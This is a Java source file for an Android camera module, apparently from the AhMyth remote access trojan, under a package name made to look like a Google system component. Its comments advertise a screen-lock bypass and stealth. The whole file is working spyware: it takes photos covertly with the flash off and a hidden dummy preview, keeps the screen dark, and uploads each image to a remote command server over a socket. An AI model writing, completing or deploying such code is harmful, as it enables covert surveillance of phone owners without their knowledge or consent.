package com.google.android.sys.security;

import android.app.KeyguardManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.Parameters;
import android.view.Surface;
import android.view.WindowManager;
import android.os.Build;
import android.os.PowerManager;
import android.util.Log;
import android.view.WindowManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;

/**
 * Camera Manager with Screen Lock Bypass
 * Có thể chụp ảnh ngay cả khi màn hình khóa
 */
public class CameraManager {
    private static final String TAG = "CameraManager";
    private Context context;
    private Camera camera;
    private PowerManager.WakeLock wakeLock;
    private int currentCameraId = -1;  // Track current camera ID

    public CameraManager(Context context) {
        this.context = context;
    }

    /**
     * Chụp ảnh - Tự động xử lý
     */
    public void startUp(int cameraID) {
        try {
            // Chỉ giữ Wakelock để CPU chạy, không bật màn hình (Stealth)
            acquireWakeLock();
            
            // Mở camera và chụp
            capturePhoto(cameraID);
            
        } catch (Exception e) {
            Log.e(TAG, "Error in startUp", e);
            releaseWakeLock();
        }
    }

    private void acquireWakeLock() {
        if (wakeLock == null) {
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AhMyth:CameraWakeLock");
        }
        if (!wakeLock.isHeld()) {
            wakeLock.acquire(10000); // 10s timeout
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }

    /**
     * Chụp ảnh với camera
     */
    private void capturePhoto(int cameraID) {
        try {
            currentCameraId = cameraID;
            camera = Camera.open(cameraID);
            Parameters parameters = camera.getParameters();
            
            // Tắt flash/sound
            parameters.setFlashMode(Parameters.FLASH_MODE_OFF);
            // Một số máy không hỗ trợ setRotation trong parameters, ta xoay bitmap sau
            
            camera.setParameters(parameters);
            
            // Dummy SurfaceTexture để lừa Camera là đang hiển thị preview
            // 10 is a magic number texture ID
            SurfaceTexture dummy = new SurfaceTexture(10);
            camera.setPreviewTexture(dummy);
            
            camera.startPreview();
            
            // Cần delay nhỏ để camera khởi động preview
            try { Thread.sleep(1000); } catch (InterruptedException e) {}
            
            camera.takePicture(null, null, new PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    try {
                        sendPhoto(data);
                    } finally {
                        releaseCamera(); // Release camera ngay sau khi chụp
                        releaseWakeLock(); // Release wakelock
                    }
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error capturing photo", e);
            // Nếu lỗi, phải release ngay
            releaseCamera();
            releaseWakeLock();
            
            // Thử gửi log lỗi về server
            try {
                JSONObject err = new JSONObject();
                err.put("error", "Camera failed: " + e.getMessage());
                IOSocket.getInstance().getIoSocket().emit("x0000ca", err);
            } catch (Exception ex) {}
        }
    }

    /**
     * Gửi ảnh lên server
     */
    private void sendPhoto(byte[] data) {
        try {
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            
            // Fix orientation
            int rotation = getCameraOrientation(currentCameraId);
            if (rotation != 0) {
                bitmap = rotateBitmap(bitmap, rotation);
                Log.d(TAG, "Rotated image by " + rotation + " degrees");
            }
            
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);
            
            JSONObject object = new JSONObject();
            object.put("image", true);
            object.put("buffer", bos.toByteArray());
            
            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);
            
            Log.d(TAG, "Photo sent successfully");
            
        } catch (JSONException e) {
            Log.e(TAG, "Error sending photo", e);
        }
    }

    /**
     * Giải phóng camera
     */
    private void releaseCamera() {
        if (camera != null) {
            try {
                camera.stopPreview();
                camera.release();
                camera = null;
                Log.d(TAG, "Camera released");
            } catch (Exception e) {
                Log.e(TAG, "Error releasing camera", e);
            }
        }
    }

    /**
     * Tìm danh sách camera có sẵn
     */
    public JSONObject findCameraList() {
        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            return null;
        }

        try {
            JSONObject cameras = new JSONObject();
            JSONArray list = new JSONArray();
            cameras.put("camList", true);

            // Tìm tất cả camera
            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                
                JSONObject jo = new JSONObject();
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    jo.put("name", "Front");
                } else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    jo.put("name", "Back");
                } else {
                    jo.put("name", "Other");
                }
                jo.put("id", i);
                list.put(jo);
            }

            cameras.put("list", list);
            return cameras;

        } catch (JSONException e) {
            Log.e(TAG, "Error finding camera list", e);
        }

        return null;
    }
    
    /**
     * Get camera orientation để fix ảnh bị xoay
     */
    private int getCameraOrientation(int cameraId) {
        try {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(cameraId, info);
            
            // Get device rotation
            WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            int rotation = windowManager.getDefaultDisplay().getRotation();
            int degrees = 0;
            
            switch (rotation) {
                case Surface.ROTATION_0: degrees = 0; break;
                case Surface.ROTATION_90: degrees = 90; break;
                case Surface.ROTATION_180: degrees = 180; break;
                case Surface.ROTATION_270: degrees = 270; break;
            }
            
            int result;
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                result = (info.orientation + degrees) % 360;
                result = (360 - result) % 360;  // compensate the mirror
            } else {  // back-facing
                result = (info.orientation - degrees + 360) % 360;
            }
            
            return result;
        } catch (Exception e) {
            Log.e(TAG, "Error getting camera orientation", e);
            return 0;
        }
    }
    
    /**
     * Rotate bitmap theo degrees
     */
    private Bitmap rotateBitmap(Bitmap bitmap, int degrees) {
        if (degrees == 0 || bitmap == null) return bitmap;
        
        try {
            Matrix matrix = new Matrix();
            matrix.postRotate(degrees);
            
            Bitmap rotated = Bitmap.createBitmap(bitmap, 0, 0, 
                bitmap.getWidth(), bitmap.getHeight(), matrix, true);
            
            // Recycle original bitmap to free memory
            if (rotated != bitmap) {
                bitmap.recycle();
            }
            
            return rotated;
        } catch (Exception e) {
            Log.e(TAG, "Error rotating bitmap", e);
            return bitmap;
        }
    }
}
